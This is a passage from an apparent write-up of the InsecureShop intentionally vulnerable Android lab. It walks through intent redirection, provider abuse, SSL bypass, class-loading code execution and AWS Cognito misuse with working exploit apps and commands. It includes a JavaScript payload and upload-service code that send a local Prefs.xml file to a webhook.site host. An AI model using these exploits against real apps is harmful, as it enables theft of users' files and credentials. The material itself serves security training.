So here the app is registering the Broadcast Receiver with the `com.insecureshop.action.PRODUCT_DETAIL` Intent. Let’s examine the `ProductDetailBroadCast`  class that contains the `onReceive`.

```java
public final class ProductDetailBroadCast extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Intent webViewIntent = new Intent("com.insecureshop.action.WEBVIEW");
        webViewIntent.putExtra("url", "https://www.insecureshopapp.com/");
        if (context != null) {
            context.startActivity(webViewIntent);
        }
    }
}
```

When the broadcast is received, it will send the `URL` extra to load the `"https://www.insecureshopapp.com/"` URL as a WebView. Note that the extra `url` is being taken as a fixed value, so we can’t pass it with our intent. The next thought is, where is the `sendBroadcast` method being called to trigger this `onReceive` method? I have found it in the `com.insecureshop.ProductAdapter` class, and it is being triggered when the more info button is clicked.

```java
       holder.getMBinding().moreInfo.setOnClickListener(new View.OnClickListener() { // from class: com.insecureshop.ProductAdapter$onBindViewHolder$3
            @Override // android.view.View.OnClickListener
            public final void onClick(View it) {
                Intent intent = new Intent("com.insecureshop.action.PRODUCT_DETAIL");
                intent.putExtra("url", ProductDetail.this.getUrl());
                context.sendBroadcast(intent);
            }
        }); 
```

The problem here is that there is no Intent extra data that we can control, all of them are hardcoded into the application. Here we have a registered broadcast receiver that is looking the action or waiting for the Intent filter with the value of `"com.insecureshop.action.PRODUCT_DETAIL"` in, which will be triggered as the more info button is clicked on the `ProductDetail` activity page. Then the `onReceive` method will be triggered to open the `"https://www.insecureshopapp.com"` URL in a WebView. 

So to exploit this behavior, logically, we have to create an identical `onReceive` method and add our own URL. But we can make the application load our own method and ignore itself?? 

**`android:priority`** is an attribute used in Android to determine the order in which components such as **broadcast receivers** handle broadcast messages. When multiple components can handle the same broadcast, the **priority** attribute determines which one should process the broadcast first.

**Where It Is Used:** commonly set for broadcast receivers in the `AndroidManifest.xml` or dynamically in code using an `IntentFilter`.

**How It Works:** The value can range from -**1000** to **1000**. A higher number indicates a higher priority. If not specified, the default priority is 0.

Great, So let’s create our own Broadcast receiver to overwrite the application receiver:

```java
package com.insecureshopapp.productlistactivityexploit;
public class MainActivity extends AppCompatActivity {
    private Context context;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        BroadcastReceiver receiver = new BroadcastReceiver() {
            @Override
            // Once a broadcast received with a specific intent
            public void onReceive(Context context, Intent intent) {
            // Getting the value from the defined extras
                Intent WebViewintent = new Intent("com.insecureshop.action.WEBVIEW");
                WebViewintent.putExtra("url", "https://itsfading.github.io");
                startActivity(WebViewintent);
            }
    };
    // Waiting for any broadcast with this intent "com.insecureshop.action.PRODUCT_DETAIL"
    registerReceiver(receiver, new IntentFilter("com.insecureshop.action.PRODUCT_DETAIL"));
}
}
```

And the most importantly is to add the `android:priority` attribute to the `AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.insecureshopapp.productlistactivityexploit">
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.ProductListActivityExploit">
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="com.insecureshop.action.PRODUCT_DETAIL" />
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

![image.png](/assets/InsecureShop/image%2014.png)

## **Insecure use of File Paths in File Provider**

> **Description:** The use of wide file sharing declaration can be used to access root directory via content Provider.

Looking at the `AndroidManifest.xml` we will notice that we have two provider declarations:

```xml
<provider 
android:name="com.insecureshop.contentProvider.InsecureShopProvider" 
android:readPermission="com.insecureshop.permission.READ" 
android:exported="true" 
android:authorities="com.insecureshop.provider"
/>

<provider 
android:name="androidx.core.content.FileProvider" 
android:exported="false" 
android:authorities="com.insecureshop.file_provider" 
android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider> 
```

Our focus will be on the second provider, as the challenge description specifies that the provider gave access to the root directory. And in the `@xml/provider_paths`  the root directory is being shared:

```xml
<?xml version="1.0" encoding="utf-8"?>
<paths xmlns:android="http://schemas.android.com/apk/res/android">
    <root-path name="root" path="/"/>
</paths>
```

That means we have access to all files under `/` directory of the devices and the word root should be added after the android authorities to trigger the provider like this `content://com.insecureshop.file_provider/root/`. But we have a problem here, this provider isn’t exported, which means only this app can be using it.

**Combining Intent Redirection with an Insecure File Provider**

If you remember, we have discovered a vulnerability before that allowed us to access any protected component, and we’ve managed to access the `PrivateActivity` Component. Let’s review the vulnerable code again for `com.insecureshop.WebView2Activity`:

```java
   public void onCreate(Bundle savedInstanceState) { 
        super.onCreate(savedInstanceState);
        setContentView(C0893R.layout.activity_webview);
        setSupportActionBar((Toolbar) _$_findCachedViewById(C0893R.C0896id.toolbar));
        setTitle(getString(C0893R.string.webview));
        Intent extraIntent = (Intent) getIntent().getParcelableExtra("extra_intent");
        if (extraIntent != null) {
            startActivity(extraIntent);
            finish();
            return;
        } 
```

So we only need to pass the protected component along with the `extra_intent` parameter. Let’s craft our exploit app:

**`MainActivity.java`**

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

                // Once the WebView2Activity Start it will start for us the Activity2 from my app
                // then access the content provider and get the content of the Prefs.xml file and add it to the Intent data
                // finally in the Activity2 we will get the Intent Data and Log it
        Intent FileProviderIntent = new Intent();
        FileProviderIntent.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        FileProviderIntent.setClassName(getPackageName(), "com.insecureshopapp.protectedinsecureprovider.Activity2");
        FileProviderIntent.setData(Uri.parse("content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml"));

        // Start the Vulnerable Actvity
        Intent WebView2Activity = new Intent();
        WebView2Activity.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
        WebView2Activity.putExtra("extra_intent", FileProviderIntent);

        startActivity(WebView2Activity);
    }
}
```

**`Activity2.java`**

```java
public class Activity2 extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_2);

        try {
            // Get the InputStream from the content URI provided by the Intent
            InputStream inputStream = getContentResolver().openInputStream(getIntent().getData());

            // Convert InputStream to String and log it
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
            reader.close();

            // Log the content of the file
            Log.d("FileContent", stringBuilder.toString());

        } catch (FileNotFoundException e) {
            Log.e("FileContent", "File not found: " + e.getMessage());
        } catch (IOException e) {
            Log.e("FileContent", "Error reading file: " + e.getMessage());
        }
    }
    }
```

Let’s break down our code:

- The `MainActivity` of my exploit app will start, and then it will directly start the vulnerable activity `WebView2Activity` as an Intent along with the `extra_intent` parameter.
- The `FLAG_GRANT_READ_URI_PERMISSION` flag in an `Intent` allows a receiving application to temporarily gain read access to the content URI being shared with it.
- Next, the `WebView2Activity` will start my `Activity2` , *don’t forget to make it exported*, and also will access the `file_provider` and get the `Prefs.xml` file and save it in the intent data.
- Finally, my `Activity2` will get the intent data, parse it and read it line by line, then log the output of the file.

![image.png](/assets/InsecureShop/image%2015.png)

## **Insecure Content Provider**

> **Description:** The content provider can be accessed by any third-party app to steal user credentials.

We previously identified two providers, and we managed to exploit one of them. The second provider is already exported, which means that any app could use it:

```xml
<provider 
android:name="com.insecureshop.contentProvider.InsecureShopProvider" 
android:readPermission="com.insecureshop.permission.READ" 
android:exported="true" 
android:authorities="com.insecureshop.provider"/>
```

Let’s take a look at the provider class to see what we can get from it.

```java
public final class InsecureShopProvider extends ContentProvider {
    public static final Companion Companion = new Companion(null);
    public static final int URI_CODE = 100;
    private static UriMatcher uriMatcher;

    @Override // android.content.ContentProvider
    public boolean onCreate() {
        UriMatcher uriMatcher2 = new UriMatcher(-1);
        uriMatcher = uriMatcher2;
        if (uriMatcher2 == null) {
            return true;
        }
        uriMatcher2.addURI("com.insecureshop.provider", "insecure", 100);
        return true;
    }

    public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
        Intrinsics.checkParameterIsNotNull(uri, "uri");
        UriMatcher uriMatcher2 = uriMatcher;
        if (uriMatcher2 == null || uriMatcher2.match(uri) != 100) {
            return null;
        }
        MatrixCursor cursor = new MatrixCursor(new String[]{"username", "password"});
        String[] strArr = new String[2];
        String username = Prefs.INSTANCE.getUsername();
        if (username == null) {
            Intrinsics.throwNpe();
        }
        strArr[0] = username;
        String password = Prefs.INSTANCE.getPassword();
        if (password == null) {
            Intrinsics.throwNpe();
        }
        strArr[1] = password;
        cursor.addRow(strArr);
        return cursor;
    }
}
```

The code here is doing two things: 

- Creating an object from the `UriMatcher` class, which is a handy class when you are writing a Content Provider or some other class that needs to respond to a number of different URIs, that matches for this URI  `com.insecureshop.provider/insecure`.
- Then, Using Cursor to query, update, delete the username and password from the `shared_prefs` i.e. `Prefs.xml` file.

So we can simply now access this content provider via the AM Commands utility.

```powershell
# android:authorities -- com.insecureshop.provider
# URI matcher -- insecure
# Read Permessions allowed -- com.insecureshop.permission.READ 
PS C:\Users\Muhammad> adb shell content query --uri content://com.insecureshop.provider/insecure
Row: 0 username=shopuser, password=!ns3csh0p
```

## **Insecure Implementation of SetResult in exported Activity**

> **Description:** The insecure implementation used in `ResultActivity` can be used to access arbitrary content providers.

Let’s review the `ResultActivity` code. First, note that this activity is an exported one.

```xml
<activity android:name="com.insecureshop.ResultActivity" android:exported="true"/> 
```

Moving to its actual code:

```java
   public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setResult(-1, getIntent());
        finish();
    }
```

What the heck is `setResult()`?? I will ask ChatGPT because I didn’t understand it well from the documentation:

The `setResult()` method in Android is used in an activity to send a result back to the activity that started it. How `setResult()` works:

- **Start Activity for Result**: The first activity (let's call it Activity A) starts another activity (Activity B) and expects a result back. Activity A uses `startActivityForResult()` to start Activity B.
    
```java
    // Activity A (First Activity):
    Intent intent = new Intent(this, ActivityB.class);
    startActivityForResult(intent, 1);  // Request code 1
```
    
- **Set the Result in the Second Activity**: In Activity B, you use `setResult()` to specify the result that should be returned to Activity A. This result can include data, or it can simply indicate that the action was successful or canceled.
- **Finish the Second Activity**: After calling `setResult()`, Activity B usually calls `finish()` to close itself and return the result to Activity A.
    
```java
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_b);
    
        // Some operation and preparing the result
        Intent resultIntent = new Intent();
        resultIntent.putExtra("result_key", "Some Result Data");
        
        // Set result as OK and attach the data
        setResult(RESULT_OK, resultIntent);
    
        // Finish this activity and return the result
        finish();
    }
```
    
- **Handle the Result in the First Activity**: When Activity B finishes, the system calls `onActivityResult()` in Activity A, where you can handle the returned result.
    
```java
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == 1) {  // Matching the request code
            if (resultCode == RESULT_OK) {  // Result is OK
                String result = data.getStringExtra("result_key");
                // Handle the result
            } else if (resultCode == RESULT_CANCELED) {
                // Handle cancellation or no result
            }
        }
    }
```
    

But in our case, we have something different: `setResult(-1, getIntent());` the `setResult` is just returns itself again, i.e. :

- By passing `getIntent()` as the second parameter to `setResult()`, you are returning the same `Intent` that was used to start the current activity. This `Intent` may contain any data that was passed when the activity was launched.

So if the `setResult()` returns data that was passed when the activity was launched, and we are controlling the launcher activity ( Activity A — Exploit app ). Simply put, we can add any code to interact with InsecureShop, as if we were him, then get the data. For simplicity, any app contains exported and unexported activities. Any app could access other apps' exported activities, but the unexported activities can only be accessed inside its app, which is simple and easy. But here we have an exported activity that allows us to get the result of any launching activity that we want. It acts as a proxy between the exploit app and the target app.

We can use this to access the unexported content provider `com.insecureshop.file_provider`. Let’s create our exploit app:

```java
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        Intent ResultActivityExploit = new Intent();
        ResultActivityExploit.setClassName("com.insecureshop", "com.insecureshop.ResultActivity");
        ResultActivityExploit.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        Uri contentUri = Uri.parse("content://com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml");
        ResultActivityExploit.setData(contentUri);
        startActivityForResult(ResultActivityExploit, 1);
    }
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

            if (requestCode == 1 && resultCode == RESULT_OK) {
                // Capture the returned data
                Uri returnedUri = data.getData();
                if (returnedUri != null) {
                    // Access the content using the returned URI
                    try {
                        InputStream inputStream = getContentResolver().openInputStream(returnedUri);
                        // Do something with the input stream, e.g., display or log the content
                        // For example, read the input stream and print to screen
                        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                        String line;
                        StringBuilder result = new StringBuilder();
                        while ((line = reader.readLine()) != null) {
                            result.append(line).append("\n");
                        }
                        // Display the content on the screen
                        Log.d("Data", result.toString());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
    }
}
```

Let’s break it down:

- The `ResultActivityExploit` Intent is set to start `ResultActivity` in Insecureshop app.
- The `Intent` includes a URI that points to the unexported content provider. And flagged with `FLAG_GRANT_READ_URI_PERMISSION` to ensure Insecureshop app has permission to read the content provider's data.
- The `ResultActivity` is started with `startActivityForResult()`, and since it is coded to return the same `Intent`, it will invoke `setResult()` with the same `Intent`.
- In our exploit app, capture the returned `Intent` in the `onActivityResult()` method. And log the returned content provider data.

![image.png](/assets/InsecureShop/image%2016.png)

## **Lack of SSL Certificate Validation**

> **Description:** The unsafe implementation of `OnReceived` SSL Error can be used to eavesdrop all the traffic loaded in WebView.

Let’s search for the `OnReceived` method. We will find the `com.insecureshop.util.CustomWebViewClient` class, which has the following code:

```java
package com.insecureshop.util;
public final class CustomWebViewClient extends WebViewClient {
    @Override // android.webkit.WebViewClient
    public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
        if (handler != null) {
            handler.proceed();
        }
    }
} 
```

Let’s break it down:

- **`CustomWebViewClient` Class**: This class extends `WebViewClient`, which allows you to customize how a `WebView` (a component for displaying web pages) behaves when interacting with web content.
- **`onReceivedSslError` Method:** This method is called when the `WebView` encounters an SSL error while loading a webpage.  The method checks if the `handler` is not null. If it is not null, it calls `handler.proceed()`.
- **`handler.proceed()`**: This method tells the `WebView` to ignore the SSL error and continue loading the page. By using `handler.proceed()`, this code effectively ignores all SSL errors, allowing potentially insecure connections to proceed.

So here we have a vulnerability that allows the user to load any URL, ignoring the SSL errors and accepting to load any invalid certificates. This will make the application’s user vulnerable to MITM attacks. To create a POC for this attack, we need to know where this custom `CustomWebViewClient` is being used. By searching through the code, the `com.insecureshop.WebViewActivity` class is using it: 

```java
  public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(C0893R.layout.activity_webview);
        webview.setWebViewClient(new CustomWebViewClient());
        }
```

Luckily, we have previously exploited a vulnerability in this WebView class that allowed us to load any URL. So, to combine with the SSL misconfiguration here, we need to use an invalid certificate. We can simply run burpsuite proxy and browse any HTTPS website. In normal cases, the browser should return an error and not load the website. But in our case, the code here is built to ignore errors and continue browsing. Let’s exploit the webview activity to load the following HTTPS URL:

```powershell
PS C:\Users\Muhammad> adb shell am start -a android.intent.action.VIEW -d insecureshop://com.insecureshop/web?url=https://itsfading.github.io
```

The normal behavior should be like that:

![image.png](/assets/InsecureShop/image%2017.png)

but in our case it is vulnerable and it worked successfully:

![image.png](/assets/InsecureShop/image%2018.png)

## **Insecure WebView Properties**

> **Description:** Insecure WebView properties are enabled that can allow third-party apps to exfiltrate local data to remote domain.

In the same class, `com.insecureshop.WebViewActivity` the `setAllowUniversalAccessFromFileURLs()` is being used. Enabling this setting allows malicious scripts loaded in a `file://` context to launch cross-site scripting attacks, either accessing arbitrary local files, including WebView cookies, app private data or even credentials used on arbitrary web sites. We have already exploited this to load different URLs with `http://` and `https://` schemas. Now we have the ability to access internal files via the `file://` schema. But the objective here is to send the exfiltrated files to a remote domain. What we can do here is to craft an HTML file that dumps the `Prefs.xml` file.

```html
<!DOCTYPE html>
<html>
<head>
</head>
<body>
    <script type="text/javascript">
        // Function to read the local file
        function readLocalFile() {
            // Create an XMLHttpRequest object
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "file:///data/data/com.insecureshop/shared_prefs/Prefs.xml", true);

            // Set up the callback to handle the file content
            xhr.onload = function () {
                // File content is in xhr.responseText
                sendToServer(xhr.responseText);
                document.write("Call sendToServer Function");
            }
            xhr.onerror = function () {
                    document.write("Failed to read the file");
                }
            // Send the request
            xhr.send();
        };

        // Function to send the file content to a remote server
        function sendToServer(fileContent) {
            var xhr = new XMLHttpRequest();
            var serverUrl = "http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b/file?="+fileContent;
            xhr.open("GET", serverUrl, true);
            xhr.onerror = function(e) {
                document.write("error again!!");
                callback(null);
            }
            xhr.send();
        }
        // Execute the function to read and exfiltrate the file
        readLocalFile();
    </script>
</body>
</html>
```

Then we need to create an application that launches an Intent to exploit the `com.insecureshop.WebViewActivity` as we did before, but this time we will make to launch our `ex.html` file that will steal the `Prefs.xml` file and send it back to us.

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        try {
            // Read the HTML file from the assets
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(this.getAssets().open("ex.html")));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line).append("\n");
            }
            reader.close();
            String readfile = stringBuilder.toString();

            // Create a new file on the external storage
            File payload = new File(Environment.getExternalStorageDirectory().getAbsolutePath(), "ex.html");
            Log.d("File", payload.toString());
            // Write the content to the new file
            FileOutputStream fos = new FileOutputStream(payload);
            fos.write(readfile.getBytes());
            fos.close();

            // Start the vulnerable WebView activity
            Intent webViewActivityIntent = new Intent("android.intent.action.VIEW");
            webViewActivityIntent.setClassName("com.insecureshop", "com.insecureshop.WebViewActivity");
            webViewActivityIntent.setData(Uri.parse("insecureshop://com.insecureshop/web?url=file://"+payload.toString()));
            startActivity(webViewActivityIntent);

        } catch (IOException e) {
            e.printStackTrace();
        }

    }
}
```

Let’s break it down:

- The code starts by accessing an HTML file named `ex.html` located in the `assets` folder of my Android project. It reads the file line by line and appends each line to a `StringBuilder`. The resulting string, `readfile`, contains the entire contents of the HTML file.
- After reading the HTML file from assets, the code creates a new file named `ex.html` on the device's external storage.
- It constructs a `File` object using the path to the external storage directory, which is retrieved with `Environment.getExternalStorageDirectory().getAbsolutePath()`.
- The content of `readfile` is then written to this new file using a `FileOutputStream`.

Note that the following permission has been given to my application to be able to write the `ex.html` on the device's external storage.

```xml
<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> 
```

- The code creates an `Intent` to start the `WebViewActivity` in the `com.insecureshop` package.
- It sets the `data` of the intent to a `Uri` that points to the newly created HTML file on external storage (`file://` URI). This instructs the `WebViewActivity` to load the HTML file when it starts.

Successfully, we were able to steal the `Prefs.xml` from the local device to a remote server. 

![image.png](/assets/InsecureShop/image%2019.png)

## **Using Components with Known Vulnerabilities**

> **Description:** Identify the vulnerable components or libraries used in the app that can allow you to exfiltrate local files to remote domain.

It appears that the application contains a vulnerable upload service library called `net.gotev.uploadservice` and it is being exported in the `androidManfiest.xml`:

```xml
<service android:name="net.gotev.uploadservice.UploadService" android:enabled="true" android:exported="true"/>
```

It appears that there is a public report on Hackerone exploiting this service:

[Quora disclosed on HackerOne: [Quora Android] Possible to steal...](https://hackerone.com/reports/258460)

As the report says, this service, since it is exported, can allow any application installed on the same device to use it to steal any files from the vulnerable application directory, in our case, `/data/data/com.insecureshop`. I will create a new exploit application and add the vulnerable library code to my exploit app. The following is the link for the vulnerable version used in the Insecureapp `android-upload-service-3.2.3`:

[https://github.com/gotev/android-upload-service/releases?page=4](https://github.com/gotev/android-upload-service/releases?page=4)

At the beginning, you have to import this library into your code with by editing the `settings.gradle` and adding the dependencies to the `build.gradle` file:

```java
dependencyResolutionManagement {
    repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
    repositories {
        google()
        mavenCentral()
        maven { url 'https://jitpack.io' }
        jcenter() // Warning: this repository is going to shut down soon
    }
}
rootProject.name = "gotevUploadServiceExploit"
include ':app'
```

```java
dependencies
{
    implementation 'com.github.gotev.android-upload-service:uploadservice:3.2.3'
}
```

Finally, hit sync Gradle, then move to edit the POC provided by the Hackerone researcher and try to steal the `Prefs.xml` file:

```java
package com.insecureshopapp.gotevuploadserviceexploit;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import java.io.FileNotFoundException;
import net.gotev.uploadservice.HttpUploadTaskParameters;
import net.gotev.uploadservice.UploadFile;
import net.gotev.uploadservice.UploadTaskParameters;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        UploadTaskParameters params = new UploadTaskParameters();
        // Random Id parameter
        params.setId("18888998");
        
        // Any Server URL to receive the local file
        params.setServerUrl("http://webhook.site/4f08c75a-a478-4f6f-93bb-2ee8eba6fa4b");
        try {
            params.addFile(new UploadFile("/data/data/com.insecureshop/shared_prefs/Prefs.xml"));
            Intent intent = new Intent("net.gotev.uploadservice.action.upload");
            intent.setClassName("com.insecureshop", "net.gotev.uploadservice.UploadService");
            intent.putExtra("taskClass", "net.gotev.uploadservice.MultipartUploadTask");
            intent.putExtra("multipartUtf8Charset", true);
            intent.putExtra("httpTaskParameters", new HttpUploadTaskParameters());
            intent.putExtra("taskParameters", params);
            startService(intent);
        } catch (FileNotFoundException e) {
            throw new IllegalStateException(e);
        }
    }

}
```

And it wooorked!! Now we have a copy of the `Pref.xml` that should only be accessible by the `com.insecureshop` app as per Android security.

![image.png](/assets/InsecureShop/image%2020.png)

## **Arbitrary Code Execution**

> **Description:** Arbitrary Code Execution via third-party package contexts.

Actually, this vulnerability took me lots of time to discover where it arises, as I was searching for any implicit intent that takes some command and executes it, and I found nothing. After that, I decided to search with the vulnerability name to check similar ones on the Internet, and I came across this link:

[Android: arbitrary code execution via third-party package contexts](https://blog.oversecured.com/Android-arbitrary-code-execution-via-third-party-package-contexts)

I have found similar code in the `LoginActivity`

```java
 for (PackageInfo info : getPackageManager().getInstalledPackages(0)) {
            String packageName = info.packageName;
            Intrinsics.checkExpressionValueIsNotNull(packageName, "packageName");
            if (StringsKt.startsWith$default(packageName, "com.insecureshopapp", false, 2, (Object) null)) {
                try {
                    Context packageContext = createPackageContext(packageName, 3);
                    Intrinsics.checkExpressionValueIsNotNull(packageContext, "packageContext");
                    Object value = packageContext.getClassLoader().loadClass("com.insecureshopapp.MainInterface").getMethod("getInstance", Context.class).invoke(null, this);
                    Intrinsics.checkExpressionValueIsNotNull(value, "packageContext.classLoad…      .invoke(null, this)");
                    Log.d("object_value", value.toString());
                } catch (Exception e) {
                    throw new RuntimeException(e);
                }
            }
```

As the article describes, In this example, the vulnerable app obtains the ClassLoader of any app whose package begins with `com.insecureshopapp` and tries to find `com.insecureshopapp.MainInterface` and call its `getInterface` method. The danger is that an attacker can create their own app with a package name that begins with the right prefix, create the specified class with this method, and include in that method code that will then be executed in the context of the victim app. Let’s create our own app to exploit this vulnerability.

Let’s create a new project in Android Studio with the package name that begins with `com.insecureshopapp` to trigger the exploit:

![image.png](/assets/InsecureShop/image%2021.png)

Then create a new class called `MainInterface` to trigger the exploit:

```java
package com.insecureshopapp;

import android.content.Context;
import android.util.Log;
import android.widget.Toast;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class MainInterface {
    public static Object getInstance(Context context) {
        // Malicious code to be executed
        StringBuilder output = new StringBuilder();
        try { 
            ProcessBuilder processBuilder = new ProcessBuilder("sh", "-c", "whoami;ls /data/data/com.insecureshop/");
            Process process = processBuilder.start();
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            process.waitFor();
            Log.d("MainInterface", "Command Output: " + output.toString());
        }
        catch (Exception e) {
            return null;
        }
        return null;
    }
}
```

Build and Install the APK:

```powershell
D:\>adb install DynamicClassLoadingExploit.apk
Performing Push Install 
DynamicClassLoadingExploit.apk: 1 file pushed, 0 skipped. 206.0 MB/s (5256157 bytes in 0.024s)
        pkg: /data/local/tmp/DynamicClassLoadingExploit.apk
Success
```

We need to make sure that we are running commands with the permissions of the vulnerable app, not our exploit app. So let’s get our app ID.

```powershell
D:\> adb shell
root@generic_x86:/ $ cd /data/data/com.insecureshop
u0_a61@generic_x86:/data/data/com.insecureshop $ ls
drwxrwx--x u0_a61   u0_a61            2024-08-26 15:15 app_webview
drwxrwx--x u0_a61   u0_a61            2024-08-28 19:47 cache
drwxrwx--x u0_a61   u0_a61            2024-08-26 13:49 code_cache
drwxrwx--x u0_a61   u0_a61            2024-08-28 18:45 shared_prefs
```

Finally, we open the Insecureshop app into the `loginActivity` to trigger the exploit and click login. Then review the logs:

```powershell
root@generic_x86:/data/data/com.insecureshop $ logcat | grep "MainInterface"
```

![image.png](/assets/InsecureShop/image%2022.png)

The exploit worked, and we ran the `whoami` command with the Insecureshop app ID and were able to list its directory.

## **AWS Cognito Misconfiguration**

> **Description:** InsecureShop application implements misconfigured AWS Cognito instance that can be used to access AWS S3 bucket. Can you find the content or access files within the S3 bucket? If you can solve this one, you'll get a V-Cola :) 🍺

As I don’t know anything about the AWS cognito, I have followed this article to help solve this challenge:

[Exploiting weak configurations in Amazon Cognito in AWS](https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963)

Let’s give a quick introduction to the AWS cognito:

AWS Cognito is an Amazon Web Service that provides authentication, authorization, and user management for web and mobile apps. It allows developers to add sign-in and sign-up functionality to their applications, handle user sessions, and manage permissions across AWS services. Cognito offers two main components:

1. **User Pools**: Manage user authentication and provide features like MFA and password recovery.
2. **Identity Pools**: Grant temporary access to AWS resources like S3, DynamoDB, etc., using either authenticated or unauthenticated identities.

At the beginning, I searched for the hardcoded credentials with `Jadx-gui` and it was embedded in the strings.xml file.

```
us-east-1:7e9426f7-******-8689-00a9a4b65c1c
```

![image.png](/assets/InsecureShop/image%2023.png)

So what we have is an `aws_Identity_pool_ID` we can use it to get temporary access to AWS resources. Let’s use the `aws-cli` for that:

```bash
# Getting the Identity ID
┌──(root㉿kali)-[~]
└─$ aws cognito-identity get-id --identity-pool-id us-east-1:7e9426f7-*****8689-00a9a4b65c1c --region us-east-1 
{
    "IdentityId": "us-east-1:15f0125a-*****-4f0a-43cd212fed35"
}
 
# Getting temporary creds                        
┌──(root㉿kali)-[~]
└─$ aws cognito-identity get-credentials-for-identity --identity-id us-east-1:15f0125a-*****-4f0a-43cd212fed35 --region us-east-1
{
    "IdentityId": "us-east-1:15f0125a-1ff0-*****-43cd212fed35",
    "Credentials": {
        "AccessKeyId": "ASIARL4*****HNH6",
        "SecretKey": "oOerEL*****ATBYkFC1IILP9aJN5k",
        "SessionToken": "IQoJb3JpZ2luX2VjENf//////////wEaCXVzLWVhc3QtMSJHMEUCIQCRAYtyg6oD/*****",
        "Expiration": "2024-09-05T18:43:37+03:00"
    }
}
```

So now we have a temporary credential. But we need to know what we can use these credentials for? As explained in the mentioned blog post, we can use the **enumerate-iam** tool for that. Let’s install it.

```bash
──(root㉿kali)-[/opt]
└─$ git clone https://github.com/andresriancho/enumerate-iam.git

┌──(root㉿kali)-[/opt/enumerate-iam]
└─$ pip3 install -r requirements.txt
┌──(root㉿kali)-[/opt/enumerate-iam]
└─$ python3 enumerate-iam.py --access-key ASIARL*****Q57WJBZK --secret-key zMCS+52lj8PfUUTwk*****p2osMt1R 
```

Unfortunately the command was stuck after running, and my thinking is that the session token is being expired, so I had to create a script to automate this process.

```python
import subprocess
import json
import os
import time

def run_aws_command(command):
    result = subprocess.run(command, capture_output=True, text=True)
    if result.returncode == 0:
        return json.loads(result.stdout)
    else:
        print(f"Error running command: {command}")
        print(result.stderr)
        return None

def run_and_stream_output(command):
    log_file = "output.log"
    
    # Run the command and redirect output to a file
    os.system(f"{command} > {log_file} 2>&1 &")

    # Monitor the log file and print new content as it is added
    with open(log_file, "r") as f:
        while True:
            line = f.readline()
            if not line:
                # No more content, wait for a bit before checking again
                time.sleep(50)
                continue
            print(line, end='')
            # Break the loop when the process finishes
            if f.tell() == os.path.getsize(log_file):
                break

def update_aws_credentials(access_key, secret_key, session_token):
    aws_credentials_path = os.path.expanduser("/root/.aws/credentials")
    
    with open(aws_credentials_path, "a") as f:
        f.write(f"\n[iam]\n")
        f.write(f"aws_access_key_id = {access_key}\n")
        f.write(f"aws_secret_access_key = {secret_key}\n")
        f.write(f"aws_session_token = {session_token}\n")

# Step 1: Get Identity ID
identity_pool_id = "us-east-1:7e9426f7-42af-*****-8689-00a9a4b65c1c"
command1 = [
    "aws", "cognito-identity", "get-id",
    "--identity-pool-id", identity_pool_id,
    "--region", "us-east-1"
]
identity_output = run_aws_command(command1)

if identity_output:
